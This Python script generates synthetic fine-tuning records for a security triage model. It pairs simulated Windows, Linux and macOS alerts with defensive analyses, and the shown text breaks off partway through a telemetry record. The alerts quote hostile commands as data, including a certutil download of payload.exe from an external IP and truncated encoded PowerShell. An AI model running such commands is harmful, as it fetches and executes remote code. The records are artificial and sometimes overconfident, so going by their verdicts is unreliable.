#!/usr/bin/env python3
"""
generate_datasets.py — Generate synthetic Tron training datasets.

Produces security_events.jsonl and telemetry_snapshots.jsonl in this directory.
Each record uses the Gemma 4 chat format expected by finetune.py.

Run:
    python generate_datasets.py
"""
import json
import os
from pathlib import Path

HERE = Path(__file__).parent


def rec(user, assistant, source, severity, category):
    return {
        "messages": [
            {"role": "user",      "content": user},
            {"role": "assistant", "content": assistant},
        ],
        "metadata": {
            "source":      source,
            "severity":    severity,
            "category":    category,
            "labeled":     True,
            "label_model": "synthetic-v1",
        },
    }


# ── Security Events ──────────────────────────────────────────────────────────

SECURITY_EVENTS = [

    rec(
        "SECURITY EVENT 4625\nCategory: Security | Severity: Warning\n"
        "Event: Failed logon attempt: administrator from 185.220.101.45 (Logon Type 3) — 47 attempts in 60 seconds\n\n"
        "Analyze this security event.",
        "**Verdict: WARNING — Active Brute-Force, Block IP**\n\n"
        "47 network logon failures in 60 seconds against the built-in administrator account from 185.220.101.45 "
        "(a known Tor exit node). This is an automated credential stuffing or brute-force campaign.\n\n"
        "**MITRE ATT&CK**: T1110 (Brute Force) / T1110.001 (Password Guessing)\n\n"
        "**Immediate actions**:\n"
        "1. Block 185.220.101.45 at perimeter firewall\n"
        "2. Check for any successful 4624 from this IP\n"
        "3. Rename or disable the built-in Administrator account\n"
        "4. Enable account lockout (5 attempts before lockout)\n"
        "5. Enable MFA on all privileged accounts\n\n"
        "**False positive**: Extremely unlikely. 47 failures/minute is not a human typo.",
        "evtx", "Warning", "Security",
    ),

    rec(
        "SECURITY EVENT 4624\nCategory: Security | Severity: Info\n"
        "Event: Successful logon: svc_deploy from 10.0.0.45 (Logon Type 2, interactive) at 03:17 local time\n\n"
        "Analyze this security event.",
        "**Verdict: INFO — Investigate If Unexpected**\n\n"
        "An interactive (Type 2, console) logon for svc_deploy at 03:17. Service accounts should never be used "
        "for interactive logons — they should authenticate via Type 5 (service) only. "
        "This could indicate a developer using a service account (policy violation) or an attacker who "
        "compromised the credential using it interactively.\n\n"
        "**MITRE ATT&CK**: T1078 (Valid Accounts) / T1078.003 (Local Accounts)\n\n"
        "**Immediate actions**:\n"
        "1. Contact whoever owns svc_deploy — was this expected?\n"
        "2. Check what commands were run (4688 Process Creation events)\n"
        "3. Apply least-privilege, deny interactive logon via GPO\n"
        "4. If unexpected: rotate svc_deploy credentials",
        "evtx", "Info", "Security",
    ),

    rec(
        "SECURITY EVENT 4719\nCategory: Security | Severity: Critical\n"
        "Event: System audit policy was changed. Subject: SYSTEM. "
        "Old policy: All auditing enabled. New policy: Object Access audit disabled.\n\n"
        "Analyze this security event.",
        "**Verdict: CRITICAL — Investigate Immediately**\n\n"
        "The audit policy was modified to disable Object Access auditing. "
        "This is a classic anti-forensic technique — attackers disable logging before performing "
        "file access or lateral movement to reduce evidence.\n\n"
        "**MITRE ATT&CK**: T1562.002 (Disable Windows Event Logging)\n\n"
        "**Immediate actions**:\n"
        "1. Re-enable Object Access auditing immediately via GPO\n"
        "2. Pull all Security events from the past 10 minutes\n"
        "3. Check who triggered this (4688 Process Creation around this timestamp)\n"
        "4. Verify no other audit categories were silently disabled\n"
        "5. Escalate to incident response\n\n"
        "**False positive**: Configuration management tools can change audit policy, "
        "but disabling it is unusual even for them.",
        "evtx", "Critical", "Security",
    ),

    rec(
        "SECURITY EVENT 4698\nCategory: Persistence | Severity: Warning\n"
        "Event: Scheduled task created: TaskName=UpdateHelper, "
        "Command=C:\\Windows\\Temp\\upd.exe, Trigger=System startup, Creator=SYSTEM\n\n"
        "Analyze this security event.",
        "**Verdict: WARNING — Highly Suspicious Persistence**\n\n"
        "A new startup-triggered scheduled task running an executable from C:\\Windows\\Temp. "
        "Legitimate Windows tasks use named tasks in \\Microsoft\\Windows paths, "
        "not generic names pointing to Temp. The SYSTEM creator context means elevated privileges.\n\n"
        "**MITRE ATT&CK**: T1053.005 (Scheduled Task)\n\n"
        "**Immediate actions**:\n"
        "1. Disable the task immediately\n"
        "2. Hash and analyze upd.exe (submit to VirusTotal)\n"
        "3. Correlate with Security event 4698 timestamp — what ran just before this?\n"
        "4. Enumerate all non-Microsoft tasks\n"
        "5. Assume malware dropper — check for additional artifacts in Temp and AppData",
        "evtx", "Warning", "Persistence",
    ),

    rec(
        "SECURITY EVENT: New Registry Run Entry\nCategory: Persistence | Severity: Critical\n"
        "Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefender\n"
        "Value: powershell.exe -WindowStyle Hidden -EncodedCommand JABjAD0AbgBlAHcA...\n\n"
        "Analyze this persistence alert.",
        "**Verdict: CRITICAL — Malware Persistence Confirmed**\n\n"
        "A registry run key named 'WindowsDefender' pointing to an encoded PowerShell command. "
        "Real Windows Defender is a service (WinDefend) that does not use HKCU Run keys. "
        "Encoded commands (-EncodedCommand) are standard obfuscation to hide malicious PowerShell.\n\n"
        "**MITRE ATT&CK**: T1547.001 (Registry Run Keys) + T1036 (Masquerading) + T1059.001 (PowerShell)\n\n"
        "**Immediate actions**:\n"
        "1. Delete the key immediately\n"
        "2. Decode the command: [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"JABj...\"))\n"
        "3. Search for the decoded script on disk and in memory\n"
        "4. Enumerate all Run/RunOnce keys in HKLM and HKCU\n"
        "5. Assume more malware is present — this was planted by a dropper\n\n"
        "**False positive**: Zero. Windows Defender does not persist via HKCU Run keys with encoded PowerShell.",
        "evtx", "Critical", "Persistence",
    ),

    rec(
        "FILE INTEGRITY ALERT\nCategory: Integrity | Severity: Critical\n"
        "Event: Critical System File Modified — C:\\Windows\\System32\\drivers\\etc\\hosts. "
        "Hash changed from A3F2B841 to 7D9CF203\n\n"
        "Analyze this integrity alert.",
        "**Verdict: CRITICAL — DNS Hijack via Hosts File Modification**\n\n"
        "The Windows hosts file has been modified. Attackers modify this file to redirect DNS lookups "
        "for legitimate domains (banks, update servers, AV) to attacker-controlled IPs. "
        "This bypasses DNS entirely.\n\n"
        "**MITRE ATT&CK**: T1565.001 (Stored Data Manipulation)\n\n"
        "**Immediate actions**:\n"
        "1. Immediately view the current hosts file and look for redirected entries\n"
        "2. Restore the clean default (only 127.0.0.1 localhost should be present)\n"
        "3. Identify what process modified the file (Sysmon event 11 or Security 4663)\n"
        "4. Block write access to hosts via ACL\n"
        "5. Check DNS cache for poisoned entries: ipconfig /displaydns\n\n"
        "**False positive**: VPN clients and security tools occasionally modify hosts. "
        "The new entries will be present in the file for review.",
        "evtx", "Critical", "Integrity",
    ),

    rec(
        "FILE INTEGRITY ALERT\nCategory: Integrity | Severity: Critical\n"
        "Event: Critical System File Modified — /etc/ssh/sshd_config. "
        "New content includes: PermitRootLogin yes, PasswordAuthentication yes\n\n"
        "Analyze this integrity alert.",
        "**Verdict: CRITICAL — SSH Backdoor Configuration**\n\n"
        "sshd_config modified to enable root login and password authentication. "
        "Most hardened Linux systems disable both. Enabling these together allows an attacker to "
        "brute-force root over SSH from anywhere on the internet — a persistent remote access backdoor.\n\n"
        "**MITRE ATT&CK**: T1098 (Account Manipulation) + T1565.001 (Stored Data Manipulation)\n\n"
        "**Immediate actions**:\n"
        "1. Set PermitRootLogin no and PasswordAuthentication no, then: systemctl restart sshd\n"
        "2. Check /root/.ssh/authorized_keys and all user authorized_keys for attacker keys\n"
        "3. Review /var/log/auth.log for successful root SSH logins since the config change\n"
        "4. Identify who made the change: ausearch -f /etc/ssh/sshd_config\n"
        "5. The original attacker access vector must still be identified\n\n"
        "**False positive**: Extremely rare. Hardening goes in the opposite direction.",
        "evtx", "Critical", "Integrity",
    ),

    rec(
        "FILE INTEGRITY ALERT\nCategory: Integrity | Severity: Critical\n"
        "Event: New file appeared in critical path after baseline — /etc/ld.so.preload. "
        "Content: /usr/lib/libprocesshider.so\n\n"
        "Analyze this integrity alert.",
        "**Verdict: CRITICAL — Linux Rootkit Loader Installed**\n\n"
        "/etc/ld.so.preload is used by the Linux dynamic linker to preload shared libraries into "
        "EVERY process. The content (libprocesshider.so) is a process-hiding rootkit library that "
        "intercepts libc calls to hide processes, files, and network connections from ps, ls, netstat.\n\n"
        "**MITRE ATT&CK**: T1014 (Rootkit) + T1574.006 (Dynamic Linker Hijacking)\n\n"
        "**Immediate actions**:\n"
        "1. rm /etc/ld.so.preload immediately\n"
        "2. Analyze the library: strings /usr/lib/libprocesshider.so\n"
        "3. WARNING: ps and ls outputs may be INCORRECT if rootkit is already loaded in your shell\n"
        "4. Use a clean boot or forensic environment for accurate enumeration\n"
        "5. System should be rebuilt — rootkits at ld.so.preload level cannot be fully cleaned\n\n"
        "**False positive**: Near-zero. /etc/ld.so.preload should not exist on a standard system.",
        "evtx", "Critical", "Integrity",
    ),

    rec(
        "PERSISTENCE ALERT\nCategory: Persistence | Severity: Critical\n"
        "Event: New LaunchDaemon detected — /Library/LaunchDaemons/com.apple.updateservice.plist. "
        "Binary: /usr/local/bin/.hidden_update. Runs as root at system boot.\n\n"
        "Analyze this persistence alert.",
        "**Verdict: CRITICAL — macOS Persistence via Fake Apple Update Daemon**\n\n"
        "A LaunchDaemon pretending to be an Apple update service pointing to a hidden binary "
        "(.hidden_update — note the leading dot). Legitimate Apple LaunchDaemons point to "
        "/System/Library or /usr/bin, not /usr/local/bin. Apple has not used this bundle identifier.\n\n"
        "**MITRE ATT&CK**: T1543.004 (Launch Daemon)\n\n"
        "**Immediate actions**:\n"
        "1. Unload: sudo launchctl bootout system /Library/LaunchDaemons/com.apple.updateservice.plist\n"
        "2. Analyze the binary: file and strings on .hidden_update\n"
        "3. Submit to VirusTotal\n"
        "4. Remove both plist and binary\n"
        "5. Enumerate all non-Apple LaunchDaemons and LaunchAgents\n\n"
        "**False positive**: Minimal. Legitimate software uses clear bundle identifiers "
        "and non-hidden binaries.",
        "evtx", "Critical", "Persistence",
    ),

    rec(
        "NETWORK ALERT\nCategory: Network | Severity: Critical\n"
        "Event: Process 'cmd.exe' (PID 5821) has an established connection to 45.142.212.100:4444\n\n"
        "Analyze this network alert.",
        "**Verdict: CRITICAL — Active C2 Session, Contain Immediately**\n\n"
        "cmd.exe on port 4444 to an external IP is the textbook Metasploit Meterpreter reverse shell. "
        "cmd.exe is a local command interpreter — it should never initiate outbound connections. "
        "This is high-confidence active compromise with a live attacker session.\n\n"
        "**MITRE ATT&CK**: T1059.003 (Windows Command Shell) + T1071.001 (Application Layer Protocol C2)\n\n"
        "**Immediate actions**:\n"
        "1. IMMEDIATE: Isolate host from network\n"
        "2. Capture memory dump before killing: procdump64 -ma 5821\n"
        "3. Kill the process\n"
        "4. Block 45.142.212.100 at firewall\n"
        "5. Preserve event logs\n"
        "6. Check for persistence: scheduled tasks, run keys, new user accounts\n"
        "7. Assume full system compromise — rebuild from known-good baseline\n\n"
        "**False positive**: Zero. cmd.exe has no legitimate use case initiating outbound TCP to external IPs.",
        "telemetry", "Critical", "Network",
    ),

    rec(
        "PROCESS ALERT\nCategory: Process | Severity: Critical\n"
        "Event: System process 'svchost.exe' (PID 9912) running from C:\\Users\\Public\\Downloads\\svchost.exe. "
        "CPU: 94.3%, Memory: 45MB. Network connection to 45.9.148.125:3333\n\n"
        "Analyze this process alert.",
        "**Verdict: CRITICAL — Cryptominer Running as Masqueraded svchost**\n\n"
        "The combination of sustained near-100% CPU, a fake svchost in Downloads, and port 3333 "
        "(XMRig/Monero mining pool default) is a high-confidence cryptominer infection. "
        "The attacker named their miner svchost.exe to blend with legitimate Windows processes.\n\n"
        "**MITRE ATT&CK**: T1036.005 (Match Legitimate Name or Location) + T1496 (Resource Hijacking)\n\n"
        "**Immediate actions**:\n"
        "1. Kill the miner: Stop-Process -Id 9912 -Force\n"
        "2. Delete the binary from Downloads\n"
        "3. Block 45.9.148.125 at firewall\n"
        "4. Scan for persistence — miners always install run keys or scheduled tasks\n"
        "5. Check how the miner was installed (browser downloads, email attachments)\n\n"
        "**False positive**: A legitimate svchost.exe will never be in Downloads and "
        "will never connect to port 3333.",
        "evtx", "Critical", "Process",
    ),

    rec(
        "CORRELATION ALERT\nCategory: Correlation | Severity: Critical\n"
        "Event: Active Breach Detected — Within 5 minutes:\n"
        "(1) 23 failed login attempts from 91.108.4.155\n"
        "(2) Process invoice_2026.exe running from AppData\\Local\\Temp\n"
        "(3) TCP connection to 185.220.101.45:31337\n\n"
        "Analyze this correlation alert.",
        "**Verdict: CRITICAL — Active Multi-Stage Intrusion, Contain Immediately**\n\n"
        "Three simultaneous indicators paint a clear picture of an active breach:\n"
        "- Stage 1 (Initial Access): Brute-force from 91.108.4.155 or phishing email opened\n"
        "- Stage 2 (Execution): Suspicious binary in Temp running — phishing attachment dropper\n"
        "- Stage 3 (C2): Port 31337 (Back Orifice default) is the active C2 channel\n\n"
        "**MITRE ATT&CK Kill Chain**: T1566 (Phishing) → T1204.002 (Malicious File) → T1095 (Non-Application Layer Protocol C2)\n\n"
        "**Immediate actions**:\n"
        "1. ISOLATE this host from the network immediately\n"
        "2. Capture memory dump before killing processes\n"
        "3. Kill invoice_2026.exe and block 185.220.101.45\n"
        "4. Preserve all logs\n"
        "5. Scan all machines that had contact with affected user's email or shared drives\n"
        "6. Initiate full incident response — assume credential theft has occurred\n\n"
        "**This is not a false positive.** Three correlated indicators in 5 minutes "
        "is statistically certain to be an active intrusion.",
        "telemetry", "Critical", "Correlation",
    ),

    rec(
        "CORRELATION ALERT\nCategory: Correlation | Severity: Critical\n"
        "Event: Ransomware-Like Behaviour — Within 5 minutes:\n"
        "- 8 critical file integrity changes (System32 files and user documents)\n"
        "- SQL Server service stopped\n"
        "- vssadmin.exe observed deleting shadow copies\n\n"
        "Analyze this correlation alert.",
        "**Verdict: CRITICAL — Active Ransomware, Emergency Response**\n\n"
        "This is the textbook ransomware pre-encryption sequence: stop backup services → "
        "delete shadow copies → begin encryption. "
        "The combination of mass file changes + service stop + vssadmin is the signature of "
        "every major ransomware family (LockBit, BlackCat, Conti, REvil).\n\n"
        "**MITRE ATT&CK**: T1486 (Data Encrypted for Impact) + T1490 (Inhibit System Recovery) + T1489 (Service Stop)\n\n"
        "**IMMEDIATE ACTIONS — Every second counts**:\n"
        "1. PULL THE NETWORK CABLE — physical disconnection, not software\n"
        "2. Do NOT shut down — RAM may contain the encryption key\n"
        "3. Take a snapshot/memory dump if virtualized\n"
        "4. Identify Patient Zero — check which machine started the shadow copy deletion\n"
        "5. Isolate ALL machines on the same network segment\n"
        "6. Contact incident response and legal counsel NOW\n"
        "7. Check offline backup integrity BEFORE attempting restoration\n\n"
        "**Recovery**: Only restore from backups created BEFORE the compromise date.",
        "telemetry", "Critical", "Correlation",
    ),

    rec(
        "CORRELATION ALERT\nCategory: Correlation | Severity: Critical\n"
        "Event: Lateral Movement Attempt — Within 5 minutes:\n"
        "(1) 156 failed logins from 10.0.1.45 targeting 12 different accounts\n"
        "(2) SMB connection from 10.0.1.45 to this host on port 445\n\n"
        "Analyze this correlation alert.",
        "**Verdict: CRITICAL — Internal Lateral Movement in Progress**\n\n"
        "An internal machine (10.0.1.45) is performing password spraying against 12 accounts "
        "and simultaneously attempting SMB access. This is the lateral movement phase — "
        "10.0.1.45 has already been compromised and the attacker is spreading through the network.\n\n"
        "**MITRE ATT&CK**: T1110.003 (Password Spraying) + T1021.002 (SMB/Windows Admin Shares)\n\n"
        "**Immediate actions**:\n"
        "1. Isolate 10.0.1.45 immediately — it is the infected pivot machine\n"
        "2. Block SMB (445) between network segments at the firewall\n"
        "3. Check Security event 4624 on this host for successful logins from 10.0.1.45\n"
        "4. Audit all 12 targeted accounts — rotate credentials for any with successful logons\n"
        "5. Identify how 10.0.1.45 was originally compromised\n"
        "6. Enable Credential Guard to protect LSASS from credential extraction\n\n"
        "**False positive**: Internal password spraying against 12+ accounts is effectively never legitimate.",
        "telemetry", "Critical", "Correlation",
    ),

    rec(
        "NETWORK ALERT\nCategory: Network | Severity: Warning\n"
        "Event: Possible Port Scan — 34 outbound SYN connections to 28 distinct external hosts within 30 seconds\n\n"
        "Analyze this network alert.",
        "**Verdict: WARNING — Outbound Port Scan from This Host**\n\n"
        "This machine is initiating a network sweep — 34 SYN packets to 28 different external hosts. "
        "Possible causes: (1) a worm/bot performing pre-infection reconnaissance, "
        "(2) a compromised machine scanning for additional targets, "
        "(3) an authorized security scanner running without approval.\n\n"
        "**MITRE ATT&CK**: T1046 (Network Service Discovery)\n\n"
        "**Immediate actions**:\n"
        "1. Identify the responsible process via netstat/Get-NetTCPConnection filtered on SynSent\n"
        "2. If it's an authorized scanner (Nmap) — document and tune alerting\n"
        "3. If it's a common app (browser, Java) — investigate for malware\n"
        "4. If unknown — treat as active compromise\n"
        "5. Block outbound on non-standard ports until source is identified\n\n"
        "**False positive**: Authorized vulnerability scanners will trigger this. "
        "Always pre-authorize and document scanning activity.",
        "telemetry", "Warning", "Network",
    ),

    rec(
        "THREAT INTEL ALERT\nCategory: ThreatIntel | Severity: Warning\n"
        "Event: Active connection to known-malicious IP: chrome.exe (PID 8432) → 91.234.99.44:443. "
        "AbuseIPDB confidence: 95/100. Reports: C2, Scanning. Country: RU\n\n"
        "Analyze this threat intel alert.",
        "**Verdict: WARNING — Browser Connecting to High-Confidence Malicious IP**\n\n"
        "chrome.exe has an HTTPS connection to an IP with 95% AbuseIPDB confidence flagged for C2. "
        "While Chrome occasionally hits blacklisted IPs via malvertising, "
        "the C2 report category elevates this. Could be: compromised extension, drive-by redirect, "
        "or the user visiting a malicious site.\n\n"
        "**MITRE ATT&CK**: T1071.001 (Application Layer Protocol — Web Protocols)\n\n"
        "**Immediate actions**:\n"
        "1. Check which URL triggered the connection (browser history around this timestamp)\n"
        "2. Review Chrome extensions — disable and test any unknown/recently installed\n"
        "3. Block 91.234.99.44 at the firewall\n"
        "4. Verify chrome.exe hash matches legitimate Google Chrome binary\n"
        "5. Run a full malware scan\n\n"
        "**False positive**: Moderate. Chrome can hit malicious IPs through ads and third-party "
        "page elements without user intent.",
        "telemetry", "Warning", "ThreatIntel",
    ),

    rec(
        "SERVICE ALERT\nCategory: Service | Severity: Warning\n"
        "Event: Watched service 'nginx' is not running (status: Stopped)\n\n"
        "Analyze this service alert.",
        "**Verdict: WARNING — Service Outage, Likely Crash or Config Issue**\n\n"
        "nginx is not running. In the absence of other indicators (no process anomalies, "
        "no security events, no network scanning), this is likely a crash, config error, "
        "or planned maintenance.\n\n"
        "**MITRE ATT&CK**: Possible T1489 (Service Stop) if attacker-caused, "
        "but without supporting indicators this is likely operational.\n\n"
        "**Immediate actions**:\n"
        "1. Check status and logs: systemctl status nginx && journalctl -u nginx -n 50\n"
        "2. If config error: nginx -t to test configuration\n"
        "3. Restart if safe: systemctl restart nginx\n"
        "4. Correlate with recent deployments or config changes\n\n"
        "**Escalation**: If this service stop is accompanied by persistence, FIM, or "
        "security alerts in the same window — escalate to Critical (ransomware pattern).\n\n"
        "**False positive rate**: High — services crash for legitimate reasons.",
        "telemetry", "Warning", "Service",
    ),

    rec(
        "SYSTEM SNAPSHOT — 2026-05-24T10:30:00Z\n\n"
        "Resources: CPU: 89.4%, Memory: 72.3%\n\n"
        "Top processes:\n"
        "- MSBuild.exe (PID 14532) — CPU: 76.2%, Path: C:\\Program Files\\Microsoft Visual Studio\\MSBuild.exe\n"
        "- node.exe (PID 11204) — CPU: 12.1%, Path: C:\\Program Files\\nodejs\\node.exe\n\n"
        "Active alerts:\n"
        "- [WARNING] CPU: High CPU usage 89.4%\n\n"
        "Analyze these alerts.",
        "**Verdict: INFO — Likely Benign Build Activity**\n\n"
        "High CPU driven by MSBuild.exe from the Visual Studio installation path and node.exe "
        "from the official nodejs path. Both are running from their expected, legitimate locations. "
        "This is typical of a developer running a .NET build alongside a JS bundler or test runner.\n\n"
        "**MITRE ATT&CK**: None applicable — no indicators of compromise detected.\n\n"
        "**Assessment**: Almost certainly a legitimate software build.\n\n"
        "**Actions**:\n"
        "1. No immediate action required on a developer workstation\n"
        "2. If this is a production server — build tools should not be installed there\n"
        "3. If alert is recurring and expected — consider raising CPU warning threshold\n"
        "4. If MSBuild runs for over 60 minutes without completing — investigate hung build\n\n"
        "**False positive rate**: High for developer workstations and CI/CD build agents.",
        "telemetry", "Info", "Cpu",
    ),

    rec(
        "PROCESS ALERT\nCategory: Process | Severity: Warning\n"
        "Event: Process 'powershell.exe' (PID 7234) running from C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe. "
        "Parent: winword.exe (PID 6100). Command: -NonInteractive -ExecutionPolicy Bypass -EncodedCommand JABz...\n\n"
        "Analyze this process alert.",
        "**Verdict: CRITICAL — Malicious Macro Execution (Word → PowerShell)**\n\n"
        "PowerShell spawned by winword.exe with -ExecutionPolicy Bypass and an encoded command. "
        "This is the macro malware pattern: a malicious Office macro bypasses execution policy "
        "and runs obfuscated PowerShell to download and execute a second-stage payload. "
        "This is one of the most common malware delivery mechanisms.\n\n"
        "**MITRE ATT&CK**: T1566.001 (Spearphishing Attachment) → T1059.001 (PowerShell) + T1027 (Obfuscated Files)\n\n"
        "**Immediate actions**:\n"
        "1. Kill both powershell.exe (7234) and winword.exe (6100) if the document is not critical\n"
        "2. Decode the command: [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"JABz...\"))\n"
        "3. Check what network connections powershell.exe has established (stage 2 download)\n"
        "4. Check if any new files were written to disk (Sysmon event 11)\n"
        "5. Check for newly created scheduled tasks or run keys\n"
        "6. Quarantine the Office document and submit to sandbox for analysis\n\n"
        "**False positive**: Near-zero for this exact pattern. "
        "Word should never spawn PowerShell with ExecutionPolicy Bypass.",
        "evtx", "Critical", "Process",
    ),

    rec(
        "PROCESS ALERT\nCategory: Process | Severity: Warning\n"
        "Event: Process 'certutil.exe' (PID 8823) spawned by cmd.exe with command: "
        "certutil.exe -urlcache -split -f http://45.76.112.200/payload.exe C:\\Temp\\update.exe\n\n"
        "Analyze this process alert.",
        "**Verdict: CRITICAL — LOLBin File Download (Certutil Abuse)**\n\n"
        "certutil.exe is being used to download a file from an external IP. "
        "This is a Living-Off-the-Land Binary (LOLBin) technique — abusing a legitimate Windows binary "
        "to bypass application whitelisting and network security controls. "
        "The -urlcache flag is not a standard certificate operation; "
        "it's specifically used by attackers for this download purpose.\n\n"
        "**MITRE ATT&CK**: T1105 (Ingress Tool Transfer) + T1218.003 (Certutil)\n\n"
        "**Immediate actions**:\n"
        "1. Kill certutil.exe immediately\n"
        "2. If payload.exe was created: do NOT execute it. Hash and submit to VirusTotal\n"
        "3. Block 45.76.112.200 at firewall\n"
        "4. Check what spawned cmd.exe → certutil.exe (the parent process chain)\n"
        "5. Review browser history and recent email attachments\n"
        "6. Run: Get-ScheduledTask and check Run keys — payload installers often persist\n\n"
        "**False positive**: certutil with -urlcache -split -f is essentially always malicious. "
        "Legitimate certutil operations don't download executables from remote IPs.",
        "evtx", "Critical", "Process",
    ),

    rec(
        "FILE INTEGRITY ALERT\nCategory: Integrity | Severity: Info\n"
        "Event: Multiple Critical System File Changes — Files modified: "
        "C:\\Windows\\System32\\cmd.exe, C:\\Windows\\System32\\certutil.exe, "
        "C:\\Windows\\SysWOW64\\cmd.exe. All hashes changed within 5-minute window.\n\n"
        "Analyze this integrity alert.",
        "**Verdict: INFO — Likely Windows Update (Patch Tuesday), Verify Then Re-Baseline**\n\n"
        "Multiple core Windows binaries changed simultaneously within 5 minutes. "
        "This pattern is consistent with Windows Update installing a cumulative security patch. "
        "An attacker modifying this many system files simultaneously is unusual — "
        "they typically target one or two files, not a broad coordinated set.\n\n"
        "**MITRE ATT&CK**: Could be T1565 if malicious, but the breadth and simultaneity "
        "strongly suggest Windows Update.\n\n"
        "**Verification steps** (required before treating as benign):\n"
        "1. Check Windows Update history: Get-HotFix | Sort-Object InstalledOn | Select -Last 5\n"
        "2. Verify new binaries are Microsoft-signed: Get-AuthenticodeSignature C:\\Windows\\System32\\cmd.exe\n"
        "3. If signed and a recent KB matches — update the FIM baseline\n"
        "4. If NOT signed or no matching KB — treat as Critical and investigate immediately\n\n"
        "**False positive rate**: High on Patch Tuesday and after cumulative update installations.",
        "telemetry", "Info", "Integrity",
    ),
]

# ── Telemetry Snapshots ──────────────────────────────────────────────────────

TELEMETRY_SNAPSHOTS = [

    rec(
        "## System Snapshot — 2026-05-24T02:14:00Z\n\n"
        "**Resources**: CPU: 98.7% (45 min sustained), Memory: 68.1%\n\n"
        "**Top processes**:\n"
        "- svchost.exe (PID 9912) CPU: 94.3%, Path: C:\\Users\\Public\\Downloads\\svchost.exe\n\n"
        "**Network connections**:\n"
        "- svchost.exe → 45.9.148.125:3333\n\n"
        "**Active alerts**:\n"
        "1. [CRITICAL] Process: System process from unexpected path (Downloads)\n"
        "2. [WARNING] CPU: Sustained high CPU 98.7% for 45 minutes\n"
        "3. [WARNING] ThreatIntel: Connection to 45.9.148.125 (AbuseIPDB: 91, known mining pool)\n\n"
        "Analyze these alerts in context.",
        "**Verdict: CRITICAL — Cryptominer Active**\n\n"
        "All three alerts point to the same threat: a cryptominer (almost certainly XMRig) "
        "disguised as a system process:\n"
        "- svchost.exe in Downloads (not System32) — masquerading\n"
        "- 94% CPU for 45 minutes — sustained mining work\n"
        "- Port 3333 connection to a known mining pool\n\n"
        "**MITRE ATT&CK**: T1036.005 (Match Legitimate Name) + T1496 (Resource Hijacking)\n\n"
        "**Actions**: Kill PID 9912, delete the binary, block 45.9.148.125, "
        "check for persistence in scheduled tasks and Run keys, "
        "review how the miner was installed.",
        "telemetry", "Critical", "Process",
    ),

    rec(
        "## System Snapshot — 2026-05-24T15:45:00Z\n\n"
        "**Resources**: CPU: 12.3%, Memory: 34.7%\n\n"
        "**Services**: All watched services Running (nginx, postgresql, redis)\n\n"
        "**Network**: 8 established connections (all to known CDN/internal IPs)\n\n"
        "**Top processes**: nginx worker, postgresql, redis-server (all from system paths)\n\n"
        "**Active alerts**: None\n\n"
        "Analyze this clean system snapshot.",
        "**Verdict: INFO — System Healthy, No Threats Detected**\n\n"
        "All indicators are within normal parameters:\n"
        "- Low CPU and memory utilization — no resource abuse\n"
        "- All watched services running normally\n"
        "- Network connections to known legitimate destinations only\n"
        "- All processes running from expected system paths\n\n"
        "**MITRE ATT&CK**: None applicable\n\n"
        "**Assessment**: This is a clean system snapshot. No action required.\n\n"
        "**Recommendation**: Continue monitoring. The baseline is learning this normal "
        "state and will alert if behavior deviates significantly.",
        "telemetry", "Info", "Agent",
    ),

    rec(
        "## System Snapshot — 2026-05-24T22:30:00Z\n\n"
        "**Resources**: CPU: 45.2%, Memory: 71.8%, Disk C: 94.7%\n\n"
        "**Active alerts**:\n"
        "1. [CRITICAL] Disk: Disk usage critical on C: (94.7%)\n\n"
        "**Top processes**: System, svchost (all from System32), explorer.exe\n\n"
        "**Network**: All connections to known Microsoft/CDN addresses\n\n"
        "Analyze these alerts.",
        "**Verdict: WARNING — Disk Space Critical, Investigate Root Cause**\n\n"
        "C: drive at 94.7% is a real operational concern that needs attention, "
        "but in the absence of other indicators (no malware, no C2 connections, "
        "no suspicious processes), this is likely an operational issue rather than a security incident.\n\n"
        "**Common causes**:\n"
        "1. Log file accumulation (IIS logs, event logs, application logs)\n"
        "2. Temporary files from large operations (builds, database exports)\n"
        "3. Windows Update download cache\n"
        "4. Note: Ransomware can cause disk fills, but the absence of FIM and service alerts makes this unlikely here\n\n"
        "**Actions**:\n"
        "1. Find large directories: Get-ChildItem C:\\ -Recurse | Sort-Object Length -Descending | Select -First 20\n"
        "2. Clear Windows Update cache if safe: Stop-Service wuauserv; Clear C:\\Windows\\SoftwareDistribution\\Download\n"
        "3. Archive or rotate old log files\n"
        "4. Set an alert at 80% to prevent reaching critical levels\n\n"
        "**Security note**: If disk fills rapidly or coincides with FIM/service alerts, re-evaluate for ransomware.",
        "telemetry", "Warning", "Disk",
    ),

    rec(
        "## System Snapshot — 2026-05-25T01:22:00Z\n\n"
        "**Resources**: CPU: 67.4%, Memory: 82.1%\n\n"
        "**Security Events** (last 5 min):\n"
        "- 4625 x 89: Failed logon attempts for 'admin' from 203.0.113.47\n\n"
        "**Network connections**:\n"
        "- 203.0.113.47:52341 → this host:22 (SSH, ESTABLISHED)\n\n"
        "**Active alerts**:\n"
        "1. [WARNING] Security: Brute-force — 89 failed logins in 5 min from 203.0.113.47\n"
        "2. [CRITICAL] Network: Admin port SSH (22) connection from external IP 203.0.113.47\n\n"
        "Analyze these alerts in context.",
        "**Verdict: CRITICAL — SSH Brute-Force with Active Connection**\n\n"
        "This is a two-alarm scenario: brute-force AND an established SSH connection "
        "from the same external IP. Either the brute-force succeeded and the attacker "
        "is now logged in, or this is a concurrent attack. Either way requires immediate response.\n\n"
        "**MITRE ATT&CK**: T1110 (Brute Force) → T1021.004 (SSH Remote Services)\n\n"
        "**Immediate actions**:\n"
        "1. Check current SSH sessions: who or w\n"
        "2. If an 'admin' session from 203.0.113.47 exists — terminate it: pkill -u admin\n"
        "3. Block 203.0.113.47 immediately: iptables -I INPUT -s 203.0.113.47 -j DROP\n"
        "4. Disable password auth for SSH: set PasswordAuthentication no in sshd_config\n"
        "5. Check /root/.ssh/authorized_keys and /home/admin/.ssh/authorized_keys for new keys\n"
        "6. Review auth.log for whether login succeeded and what commands were run\n"
        "7. If login succeeded — full incident response, assume system is compromised",
        "telemetry", "Critical", "Security",
    ),

    rec(
        "## System Snapshot — 2026-05-25T09:15:00Z\n\n"
        "**Resources**: CPU: 31.2%, Memory: 55.4%\n\n"
        "**Active alerts**:\n"
        "1. [WARNING] Baseline: CPU anomaly — Z-score 4.2 (normal: 15.3%, current: 31.2%)\n"
        "2. [INFO] Process: New process observed — 'backup_agent.exe'\n\n"
        "**Top processes**:\n"
